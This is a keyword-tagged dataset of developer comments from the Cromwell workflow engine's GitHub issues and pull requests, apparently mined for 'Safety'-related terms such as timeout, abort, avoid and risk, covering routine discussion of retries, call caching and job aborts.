Safety,"@francares sorry for the slow responses this week. We've got people out this week so we're falling a bit behind on code reviews (also this week was a release week, which has taken up a good amount of my time). I will definitely review again by EOD tomorrow, but I'm not avoiding this! I need to review @kshakir's PR first because I'm way overdue on that one, but this one is next.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-191947625:270,avoid,avoiding,270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-191947625,1,['avoid'],['avoiding']
Safety,@freeseek are you reporting a bug in Cromwell's 504 detection and retry logic?. Receiving a 504 error in the first place is a Google problem and we have no control.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760305422:52,detect,detection,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760305422,1,['detect'],['detection']
Safety,@gauravs90 at the risk if putting words in his mouth I think he was wondering to what extent this is just moving existing code around vs sweeping changes. IOW is this a 5 min change or a 5 day change?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174085300:18,risk,risk,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174085300,1,['risk'],['risk']
Safety,"@genomics-geek Having just spent some time last week on this (also on SGE), I believe you need this:; https://cromwell.readthedocs.io/en/stable/backends/HPC/#exit-code-timeout",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-510116881:168,timeout,timeout,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-510116881,1,['timeout'],['timeout']
Safety,"@genomics-geek Just ran into the same problem here.; ```; Unable to run job: failed receiving gdi request response for mid=1 (got syncron message receive timeout error)..; Exiting.; error: commlib error: got read error (closing ""vm-gridmaster/qmaster/1""); ```; This kind of glitch seems pretty common in SGE, unfortunately - it would be nice to have a workaround.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-520629335:154,timeout,timeout,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-520629335,1,['timeout'],['timeout']
Safety,@geoffjentry @cjllanwarne I removed model package to avoid larger discussions on the topic.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/758#issuecomment-216398775:53,avoid,avoid,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/758#issuecomment-216398775,1,['avoid'],['avoid']
Safety,"@geoffjentry I believe that is correct.; Just to get some clarification on this - why does the summary refresh actor need to be disabled to use cromwell as read-only ? I understand that the refresh actor writes to the database, but in very low amounts (1 line per workflow), and its purpose (as I understand it, @mcovarr ?) is to help relieve the metadata endpoint by avoiding recomputing the current status on every call, which would be useful for a read-only cromwell ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950069:368,avoid,avoiding,368,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950069,1,['avoid'],['avoiding']
Safety,"@geoffjentry I think I understand what you mean. From my perspective it's a matter of where to stop.; We could ban entirely `Future`s from the codebase and decide that every asynchronous task deserves its own actor. That seems a bit extreme to me though.; I see your point about future being dangerous inside of actors. However I believe that small actors with 2 states and 3 internal messages are a small enough unit to be understood well enough to avoid the kind of problems we encountered before. This actor doesn't even have state data, there's no state to be shared or mutated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218578385:450,avoid,avoid,450,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218578385,1,['avoid'],['avoid']
Safety,"@geoffjentry I want to resort to authority and say ""Zen of Akka""... . Reasons for my gut feeling: A mutable val makes it look and act more like a state machine, and reduces the risk of accidentally leaking the variable pointer to other threads which may update it out of band. Obviously not likely in this case, but as a muscle memory thing a-la `Some(constant)`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1044#issuecomment-227570413:177,risk,risk,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1044#issuecomment-227570413,1,['risk'],['risk']
Safety,"@geoffjentry Is this at the time of running the workflow, or after the fact (like #1670)?. As a **workflow runner**, I want **to be able to select certain tasks to call cache or not call cache on**, so that I can **avoid reusing bad or old cache results**. ; - Effort: **Small**; - Risk: **Small to Mediume**; - This should not be a runtime attribute; - Make sure users don't overuse this feature and eliminate the benefits of call caching (i.e. clearly state when users should use this); - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327932586:215,avoid,avoid,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327932586,3,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,@geoffjentry Thanks for the quick response. Goal here is to enable rapid failure detection. I'm very open to different approaches to this!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-380300215:81,detect,detection,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-380300215,1,['detect'],['detection']
Safety,@geoffjentry The PR is to make it run if execution fails. I didn't want to conflict with Scott's PR so I didn't do the abort case,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/893#issuecomment-222984745:119,abort,abort,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/893#issuecomment-222984745,1,['abort'],['abort']
Safety,"@geoffjentry Verbosity is just a small part of that. Making different parts of the code aware of the each other, where avoidable, doesn't seem like a very good idea. If I'm not mistaken, what you're saying (and what I initially implemented) is something like the erstwhile `DataAccess` (which would be the `ServiceRegistoryActor` in the current world). With this, each step (actor) of the workflow had a reference to it and pushed to it independently. Any change to the dataAccess might have required changes to all the classes which were accessing it. Alternatively, if there was just one entity which handled the responsibility of collecting the metadata, by sniffing around the actors without their knowledge, and then pushed to the database, we need only change this entity for any modifications if there were to happen to the data access stuff. I'll try to explain with a very simple (and silly) analogy: (Honestly, couldn't come up with anything better.); Consider a ginormous Octopus (= `ServiceRegistry`) with a black ink on the tips of it's tentacles, with each of it's legs touching upon different rooms (= classes) in a house. If someday we decide to replace that octopus with something else, we'll be needing to wipe that ink from all the rooms upon which it was standing. On the other hand, if it were to sit and cuddle up just in a single room, there's simply less and comparatively easy work to do to wipe that up. It's simply the same idea here. The Metadata producing entities in the engine can just go about minding their own business, while a third party (those classes with some weird names currently [CromwellProfilerFsm and WorkflowProfilerActor]) handle what they are meant to do: Profile a given workflow execution. (all the while without explicitly telling those execution engine entities that it's reading it's state and data information). If the intentions are still not clear, let's talk about it tomorrow in the meeting to make progress with this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218970121:119,avoid,avoidable,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218970121,2,['avoid'],['avoidable']
Safety,@geoffjentry What benefit does the AsyncAppender have for our logs? How realistic is the risk that some messages could be dropped?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329481910:89,risk,risk,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329481910,1,['risk'],['risk']
Safety,"@geoffjentry Yeah, I have also hit my share of obscure errors over time in my applications, though by that time the failure-recovery rules usually kicked in to keep the system in a running state, with the periodic subsequent log monitoring and analysis in case certain edge-cases become more prevalent. It is great to hear about the shift towards scaling being explored for the near future, but I think you might have made things unnecessarily hard for yourself. Usually it is much easier to have scaling be built-in from the start into the application, and then tuning through metric-based scaling policies the application-triggered scaling rules, which can be bounded by appropriate upper limits before, or interactively after application deployment. This way one has the benefits of both worlds - controlling costs with scalability capabilities for satisfying possible capacity/performance requirements - but I am sure you are already aware of that as well :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235:124,recover,recovery,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235,1,['recover'],['recovery']
Safety,@geoffjentry and @cjllanwarne:; Thank you for you response. I do understand your concerns. In the future I we going to move away from traditional HPC systems (i hope). For now we have sadly to deal with them. I already have this config value in place with a default. I can remove this default and using this behaviour when `exit-code-timeout` is set. This easy to do.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423100767:334,timeout,timeout,334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423100767,1,['timeout'],['timeout']
Safety,"@geoffjentry asked me to clarify, so here I am!. Currently, PAPI doesn't understand FOFN... so they are really just a File that contains strings. Often they are created by taking the file output of a scatter call as an array and writing it to an array like. ```; Array[File] vcfs = PreviousTask.output ...; File fofn = write_lines(vcfs); ```. Then that FOFN is used as the parameter to the task, and used by the tool in the command directly. The only thing that gets localized by PAPI is the FOFN itself. Keep in mind right now that the only scenario where this works is where your docker has access to the file, which on Google means when you're running in service account mode, but hopefully we can overcome that in the future. Just for context, my use case here is more like 'resume' than call caching. I don't expect to find results from some previous/other run of the pipeline. It's really that something broke, I tweaked the WDL, and now want to basically pick up where I left off. That's the specific problem I have (and any methods developer will have with a FOFN step). There are two ways I can think of going about this:. 1. Fix call caching to handle FOFNs specifically. This is tricky I think, but is most robust. In this case, I want Cromwell to understand a File of File references as a specific type but just for call caching purposes. 2. Change call caching to re-use files rather than copying, thus the path of the file doesn't changes, the FOFN doesn't change, and the call cache hits. This is how I ended up working around this by splitting the WDL into pieces where I supply the inputs to avoid the cache-miss step. I believe we have this option in the SFS?. In your proposal @cjllanwarne a FileRef would be hashed like a file for job avoidance, but treated like a string for all other purposes (e.g. passing to PAPI, etc)? I think that could work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901:1609,avoid,avoid,1609,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901,4,['avoid'],"['avoid', 'avoidance']"
Safety,"@geoffjentry sounds like the workflow notes would be another endpoint, is that right? If so, what would you say the effort and risk is?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1679#issuecomment-326331514:127,risk,risk,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1679#issuecomment-326331514,1,['risk'],['risk']
Safety,"@geoffjentry sounds like this will be necessary in a CaaS world, do you agree?. As a **FC/GOTC developer**, I want **Cromwell to test with Cloud SQL after every release**, so that I can **avoid critical (? @helgridly a bug in Cloud SQL would be critical, right?) regressions and issues in production**.; - Effort: **Medium**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1726#issuecomment-328536302:188,avoid,avoid,188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1726#issuecomment-328536302,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,@geoffjentry what do you think the effort would be? Any risks?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-326636978:56,risk,risks,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-326636978,1,['risk'],['risks']
Safety,"@geoffjentry when you have 5 mins, can you sanity check the last 3 commits?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/792#issuecomment-217541408:43,sanity check,sanity check,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/792#issuecomment-217541408,1,['sanity check'],['sanity check']
Safety,"@hkeward welcome to our repo and thank you for your contribution. We were actually looking at making this timeout configurable ourselves, so you've done some of our work for us.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5273#issuecomment-555176923:106,timeout,timeout,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5273#issuecomment-555176923,1,['timeout'],['timeout']
Safety,"@hmkim ; I continue the break point to run it again, it works now.; What part of process takes long idle time in your instance? what makes the long idle time?; In fact, the pipeline always consists of multiple processes and works on hundreds of samples. ; In case of time, what should i config to avoid this errors not run it again?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4403#issuecomment-439905197:297,avoid,avoid,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4403#issuecomment-439905197,1,['avoid'],['avoid']
Safety,@illusional I think that as long as @vsoch and @TMiguelT are :+1: on the current state that we're good to go. I'll wait to hear from them just to be on the safe side.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-468378046:156,safe,safe,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-468378046,1,['safe'],['safe']
Safety,"@jacarey @vivster7 Just as a sanity check, I'm assuming you all actually tested this for realz, right? i.e. not just unit tests? . 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/842/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/842#issuecomment-220619184:29,sanity check,sanity check,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/842#issuecomment-220619184,1,['sanity check'],['sanity check']
Safety,"@katevoss Hi Kate. I think there are two aspects to the issue worth considering - the first being how often we hit this problem in practice (I'll get back with you after I ask the production team) and the second being whether the underlying cause has been addressed - which is that relying only on the creation of a file to detect task completion is not robust at least for SGE/PBS type backends where jobs may be killed by the scheduler out-of-process without creating a file. Based only on the release changelog I suspect that the answer to the second is no. I suggest re-using the ""check-alive"" configuration value that's documented as currently used only on cromwell restart, for periodic (but infrequent) polling of the scheduler.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-325070557:324,detect,detect,324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-325070557,1,['detect'],['detect']
Safety,"@katevoss I would love to have this functionality. I'm effectively nesting two scatters (by scatter over calls to a subworkflow with a scatter), which returns an Array[Array[File]]. Nothing happens to those Files at the top level, they just get passed up the callstack, so it doesn't matter to me which scatter generated which subset of Files. It would be nice to be able to operate on a flattened Array of Files at the top level to avoid gathering and moving extra data or making the WDL unnecessarily complicated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2702#issuecomment-369630808:433,avoid,avoid,433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2702#issuecomment-369630808,1,['avoid'],['avoid']
Safety,"@katevoss IIRC the intended behavior is that submitted files are stored as-is no matter what and then when we pick up the workflow we check to see if everything is valid. However @cjllanwarne noticed that we are actually validating one of the input files at actual submission time which led to two issues: a) there was a reason why we didn't want to do that in the first place, b) there was a suspicion that this could lead to timeouts instead of errors anyways",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328278898:427,timeout,timeouts,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328278898,1,['timeout'],['timeouts']
Safety,"@katevoss Sounds good. Recently, abort has generally worked for me. Just not in this case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-344393380:33,abort,abort,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-344393380,1,['abort'],['abort']
Safety,"@kcibul @ruchim Could you opine (since ""Job Avoidance"" is certainly now available) what kind of behaviour we want if we ""clear up"" a call-cached task?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/601#issuecomment-254317040:44,Avoid,Avoidance,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/601#issuecomment-254317040,1,['Avoid'],['Avoidance']
Safety,"@kcibul A few questions about this:; - Should it support in-place DB migration, or DB A to DB B, or both ?; - Is it a separate program that runs independently ? If yes does it still live in the Cromwell repo ? Or a new flag in cromwell (like server, run, migration), ? Is there any ""automagic"" detection that my DB needs an update when I run cromwell 0.20 on a pre-0.20 DB ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/789#issuecomment-226247983:294,detect,detection,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/789#issuecomment-226247983,1,['detect'],['detection']
Safety,"@kcibul From what I understand, it is still a frequent problem that P.API does not abort workflows even though Cromwell asked. . @geoffjentry do you have an idea about the effort involved to make this fix? . @abaumann Do we have any data (from FC) with how often this is happening?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1139#issuecomment-323855111:83,abort,abort,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1139#issuecomment-323855111,1,['abort'],['abort']
Safety,@kcibul This problem doesn't exist in develop (that I can see) as we're not currently supporting restart/recover,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/999#issuecomment-225944359:105,recover,recover,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/999#issuecomment-225944359,1,['recover'],['recover']
Safety,"@kshakir As per my understanding, `eventually` was the one that was timing out. When I tested it last week with several builds, the test did not fail in any of them. And I had observed that when I decreased the span scale factor, it started failing again. Maybe there are other timeouts failing the test as well. I will try and add println-debugging.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430417752:278,timeout,timeouts,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430417752,1,['timeout'],['timeouts']
Safety,"@kshakir exporting the factor (to `sbt`) does actually scale the timeout. I ran the test couple of times, and it hasn't failed so far. And upon adding println-debugging I did see the timeout being scaled by 10.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430822659:65,timeout,timeout,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430822659,2,['timeout'],['timeout']
Safety,@kshakir is there a configurable timeout for job completion in the SFS backends?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4050#issuecomment-417333069:33,timeout,timeout,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4050#issuecomment-417333069,1,['timeout'],['timeout']
Safety,@kshakir would it change your mind about the Centaur test to know the cases in `WomTypeSpec.scala` successfully detect the issue at a unit level?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4324#issuecomment-433928082:112,detect,detect,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4324#issuecomment-433928082,1,['detect'],['detect']
Safety,"@ktibbett is this still a feature that would help the production pipeline? ; @geoffjentry aside from the risk of duplicate naming for output and logs, are there any other risks involved? What would be the effort?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325671959:105,risk,risk,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325671959,2,['risk'],"['risk', 'risks']"
Safety,"@ldgauthier and @Leetl1220 do you know how many users use Cromwell with SGE?. As a **SGE user**, I want to **the SGE config to be tested in Centaur**, so that I can **avoid regressions**.; - Effort: **Medium to Large**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324443806:167,avoid,avoid,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324443806,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"@mcovarr @aednichols you both asked the same question from different directions... I'll try to answer both in one go:. * This *does not* alter how the class operates in production because it's a `None foreach { ... }`.; * I override the `None` in the spec so that I can guarantee the events land as a unit and aren't interrupted by the occasional flushing action. FWIW I did try to move *all* of this logic into the test class to avoid cluttering the main, but got tangled up trying to override the FSM actions with a `receive` in the test class and it ended up not working as I'd hoped.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4898#issuecomment-486854451:430,avoid,avoid,430,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4898#issuecomment-486854451,1,['avoid'],['avoid']
Safety,"@mcovarr @geoffjentry Like I mentioned at standup I added a second commit after seeing a failure in centaur.; What happened was JES failed the job because it couldn't localize the auth file (not found).; However I didn't see anything in Cromwell suggesting that the upload failed (which we log if it happens). So my guess is JES tried to localize the file when Cromwell was restarting the workflow and hence re-writing the file, which made sense according to the timestamps at least. This commit makes the upload of the auth file fail if the file already exists, unless it's a known restart in which case it ignores the failure and keeps going. I think it makes sense to fail the workflow if there's already an auth file for this workflow and it's the *first* time we run it. It might indicate something is wrong and failing the workflow avoids taking chances with refresh tokens / secrets. If you disagree please voice your concerns :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2490#issuecomment-319093447:838,avoid,avoids,838,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2490#issuecomment-319093447,1,['avoid'],['avoids']
Safety,"@mcovarr I agree (although that day might be sooner than you think, re WDLd3)... read my pluggable comment only as ""this is background info on why I don't want another function if we can avoid it""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349346941:187,avoid,avoid,187,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349346941,1,['avoid'],['avoid']
Safety,@mcovarr I believe comments are addressed modulo the 1 WONTFIX and my statement that I might add some extra unit testing to the old abort code,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-442213519:132,abort,abort,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-442213519,1,['abort'],['abort']
Safety,"@mcovarr I don't *think* so but as I mentioned earlier I wasn't completely buying what jprofiler was selling and need to take a closer look. Also our comparisons shouldn't be hash code based anyways. One thing I did turn up was elsewhere in that file you had been converting some sets to lists to avoid hashes coming out of filters and such, that might be a thing here as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277886109:297,avoid,avoid,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277886109,1,['avoid'],['avoid']
Safety,@mcovarr I investigated as part of the ticket. I wasn't able to recreate the problem but I couldn't see why the option to update the abort function should be disallowed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164849222:133,abort,abort,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164849222,1,['abort'],['abort']
Safety,"@mcovarr I think we still need to ensure that the submission is correct before sending back a 201 with the workflow ID, which means being sure that everything necessary to start executing the workflow is ready (all DB executions succeeded etc...); @kshakir I see your point, however in this case I don't think having the ask timing out is a problem, if a WorkflowActor takes forever to initialize itself then there is actually some bottleneck further down, and it might even be better to say ""sorry but we're really too busy right now, retry later"", than keeping waiting for WorkflowActors, which is going to trigger a timeout anyway since this comes from the ""submit endpoint"" and spray is not going to wait forever either.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161985376:619,timeout,timeout,619,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161985376,1,['timeout'],['timeout']
Safety,@mcovarr I was just thinking that this PR probably warrants careful timing & some coordination to avoid a giant rebase hell for everyone,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232191521:98,avoid,avoid,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232191521,1,['avoid'],['avoid']
Safety,@mcovarr I've left the update enabled but added a new warning. So hopefully it's at least as vocal and warn-y as before but won't outright ignore the updated abort function.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164886510:158,abort,abort,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164886510,1,['abort'],['abort']
Safety,"@mcovarr On top of addressing your comments I added a small migration as I realized it's technically possible for some workflows to be in `RestartableRunning` or `RestartableAborting` when Cromwell starts, which are now replaced by `Running` and `Aborting` with the restarted flag to `true`. If you don't mind re-taking a look at the liquibase :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2829#issuecomment-342570056:247,Abort,Aborting,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2829#issuecomment-342570056,1,['Abort'],['Aborting']
Safety,"@mcovarr Sure. Using the async ref worked for me, such that the tests didn't need to be ignored. FYI, I did run into at least one of our wonderful intermittent timeouts, that disappeared after re-running.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155192304:160,timeout,timeouts,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155192304,1,['timeout'],['timeouts']
Safety,@mcovarr We though develop is in a relative unstable state with all the restructuring going on and that it would be safer to branch off of an earlier version. This commit is the commit that fixed the duplicate inputs bug.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198468069:116,safe,safer,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198468069,1,['safe'],['safer']
Safety,"@mcovarr Yeah the reason for this PR is that there is currently a mutable `var` that holds the process when it's created, so it can be accessed by the abort method. I know `var`s are evil but in this case creating an underlying FSM just to get rid of this `var` does seem an overkill to me. I couldn't find a way to use the `BackendJobExecutionActor` itself to encapsulate this mutable state though, which is why I ended up with this. I can give it another shot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214750391:151,abort,abort,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214750391,1,['abort'],['abort']
Safety,@mcovarr and @kshakir I had to rebase on top of your all's changes so if you could take a closer than usual eye on the abort logic in `CromwellApiService` to make sure I've captured your changes that'd be 💯,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-441837669:119,abort,abort,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-441837669,1,['abort'],['abort']
Safety,"@mcovarr can you explain more what this issue is? Alternatively, I can close it and you're welcome to add to the [Abort spec](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1409#issuecomment-324468545:114,Abort,Abort,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1409#issuecomment-324468545,1,['Abort'],['Abort']
Safety,"@ndbolliger I'm guessing this is no longer a problem since it hasn't gotten any attention in 9 months...sorry about that! Closing it out unless anyone objects, we have a [Spec Document for Aborts](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit) now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775#issuecomment-326421477:189,Abort,Aborts,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775#issuecomment-326421477,1,['Abort'],['Aborts']
